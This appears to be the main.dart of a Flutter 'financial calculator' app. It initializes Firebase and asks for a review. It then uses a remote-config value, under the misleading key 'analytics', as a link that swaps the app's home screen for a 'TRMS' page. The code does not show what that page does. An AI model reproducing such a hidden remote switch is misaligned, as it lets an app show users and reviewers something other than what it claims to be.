import 'package:financial_calc_app/model/configer.dart';
import 'package:financial_calc_app/pages/splash_page.dart';
import 'package:financial_calc_app/pages/trms.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:intl/date_symbol_data_local.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'model/ini.dart';

int? initScreen;
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  initializeDateFormatting('ru_RU');
  initScreen = preferences.getInt('initScreen');
  await preferences.setInt('initScreen', 1);
  await Firebase.initializeApp(options: AppFirebaseOptions.currentPlatform);

  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));

  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await NotificationsFirebase().activate();
  await rateApplication();
  runApp(const MyApp());
}

late SharedPreferences prefs;
final ratex = InAppReview.instance;

Future<void> rateApplication() async {
  await getRatingStar();
  bool alrd = prefs.getBool('rateApp') ?? false;
  if (!alrd) {
    if (await ratex.isAvailable()) {
      ratex.requestReview();
      await prefs.setBool('rateApp', true);
    }
  }
}

Future<void> getRatingStar() async {
  prefs = await SharedPreferences.getInstance();
}

Future<String> getDataAnalytics() async {
  final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
  final j = remoteConfig.getString('analytics');
  if (!j.contains('analyticsNone')) {
    return j;
  }
  return "";
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: FutureBuilder<String>(
        future: getDataAnalytics(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return const Scaffold(
              body: Center(
                child: CircularProgressIndicator(),
              ),
            );
          } else if (snapshot.connectionState == ConnectionState.done &&
              snapshot.data != '') {
            return TRMS(
              link: snapshot.data!,
            );
          } else {
            return const SplashPage();
          }
        },
      ),
    );
  }
}
